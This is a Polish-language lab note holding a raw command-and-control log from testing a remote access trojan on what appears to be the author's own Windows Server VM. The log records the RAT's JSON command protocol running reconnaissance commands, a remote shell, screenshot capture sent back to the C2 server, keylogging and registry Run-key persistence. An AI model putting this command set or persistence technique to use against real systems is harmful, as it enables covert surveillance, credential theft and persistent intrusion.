---
title: "Log sesji C2 — optymalizacja RAT .57"
date: 2026-08-16
type: log
tags: [lab, rat, c2, log, optimization]
---

# Log sesji C2 (optymalizacja RAT .57)

Surowy log serwera C2 (/root/rat-c2/c2_session.log) z optymalizacji [[2026-08-16_optymalizacja_RAT_57]].

```text
[01:32:53] C2 listening on 0.0.0.0:9999 (FIFO=/tmp/c2in.fifo)
[01:33:12] AGENT CONNECTED 5.175.189.57
[01:33:12] AGENT REGISTERED 5.175.189.57 user=Administrator hostname=WIN-T5BVVHUNVJI
[01:33:29] SEND {"command": "whoami", "cmd_id": 1}
[01:33:29] RESULT cmd_id=1 {"success": true, "stdout": "user=Administrator hostname=WIN-T5BVVHUNVJI domain=WIN-T5BVVHUNVJI cwd=C:\\Users\\Administrator\\Desktop", "type": "result", "cmd_id": 1}
[01:33:31] SEND {"command": "sysinfo", "cmd_id": 2}
[01:33:33] RESULT cmd_id=2 {"success": true, "stdout": "node=WIN-T5BVVHUNVJI\nos=Windows-2022Server-10.0.20348-SP0\narch=64bit\nmachine=AMD64\npython=3.12.10\ncpu=AMD64 Family 26 Model 68 Stepping 0, AuthenticAMD\n\nHost Name:                 WIN-T5BVVHUNVJI\nOS Name:                   Microsoft Windows Server 2022 Standard Evaluation\nOS Version:                10.0.20348 N/A Build 20348\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Server\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Proxmox\nRegistered Organization:   \nProduct ID:                00454-40000-00001-AA946\nOriginal Install Date:     8/13/2026, 2:41:05 PM\nSystem Boot Time:          8/15/2026, 9:39:42 AM\nSystem Manufacturer:       QEMU\nSystem Model:              Standard PC (Q35 + ICH9, 2009)\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: AMD64 Family 26 Model 68 Stepping 0 AuthenticAMD ~4292 Mhz\nBIOS Version:              EFI Development Kit II / OVMF 3.20230228-4, 6/6/2023\nWindows Directory:         C:\\Windows\nSystem Directory:          C:\\Windows\\system32", "type": "result", "cmd_id": 2}
[01:33:42] SEND {"command": "shell", "args": {"cmd": "ipconfig"}, "cmd_id": 3}
[01:33:42] RESULT cmd_id=3 {"success": true, "stdout": "\nWindows IP Configuration\n\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::fd52:7b9:8460:2518%4\n   IPv4 Address. . . . . . . . . . . : 5.175.189.57\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 5.175.189.1\n", "exit_code": 0, "type": "result", "cmd_id": 3}
[01:33:45] SEND {"command": "screenshot", "cmd_id": 4}
[01:33:45] RESULT cmd_id=4 {"success": true, "format": "png", "size": 41553, "data_b64": "<55404 bytes b64>", "stderr": "", "type": "result", "cmd_id": 4}
[01:33:45]   saved binary -> /root/rat-c2/out/4_artifact.png (41553 bytes)
[01:34:15] SEND {"command": "keylog_start", "cmd_id": 5}
[01:34:15] RESULT cmd_id=5 {"success": true, "stdout": "SetWindowsHookEx failed", "type": "result", "cmd_id": 5}
[01:34:28] SEND {"command": "keylog_stop", "cmd_id": 6}
[01:34:28] RESULT cmd_id=6 {"success": true, "stdout": "keylogger not running", "type": "result", "cmd_id": 6}
[01:35:55] AGENT DISCONNECTED 5.175.189.57
[01:36:06] AGENT CONNECTED 5.175.189.57
[01:36:06] AGENT REGISTERED 5.175.189.57 user=Administrator hostname=WIN-T5BVVHUNVJI
[01:36:20] SEND {"command": "keylog_start", "cmd_id": 7}
[01:36:20] RESULT cmd_id=7 {"success": true, "stdout": "keylogger started (WH_KEYBOARD_LL)", "type": "result", "cmd_id": 7}
[01:36:33] SEND {"command": "keylog_stop", "cmd_id": 8}
[01:36:33] RESULT cmd_id=8 {"success": true, "stdout": "keylogger stopped, 0 keys", "type": "result", "cmd_id": 8}
[01:37:30] AGENT DISCONNECTED 5.175.189.57
[01:37:36] AGENT CONNECTED 5.175.189.57
[01:37:36] AGENT REGISTERED 5.175.189.57 user=Administrator hostname=WIN-T5BVVHUNVJI
[01:37:52] SEND {"command": "keylog_start", "cmd_id": 9}
[01:37:53] RESULT cmd_id=9 {"success": true, "stdout": "keylogger started (WH_KEYBOARD_LL)", "type": "result", "cmd_id": 9}
[01:38:05] SEND {"command": "keylog_stop", "cmd_id": 10}
[01:38:05] RESULT cmd_id=10 {"success": true, "stdout": "keylogger stopped, 0 keys", "type": "result", "cmd_id": 10}
[01:38:27] SEND {"command": "keylog_start", "cmd_id": 11}
[01:38:27] RESULT cmd_id=11 {"success": true, "stdout": "keylogger started (WH_KEYBOARD_LL)", "type": "result", "cmd_id": 11}
[01:38:39] SEND {"command": "keylog_stop", "cmd_id": 12}
[01:38:39] RESULT cmd_id=12 {"success": true, "stdout": "keylogger stopped, 40 keys", "type": "result", "cmd_id": 12}
[01:38:55] SEND {"command": "persistence", "args": {"path": "C:/Users/Administrator/Desktop/dist/agent.exe", "value": "Agent", "hive": "HKCU"}, "cmd_id": 13}
[01:38:55] RESULT cmd_id=13 {"success": true, "stdout": "persistence set: HKCU\\Run\\Agent = C:/Users/Administrator/Desktop/dist/agent.exe", "type": "result", "cmd_id": 13}
[01:39:24] AGENT DISCONNECTED 5.175.189.57
```
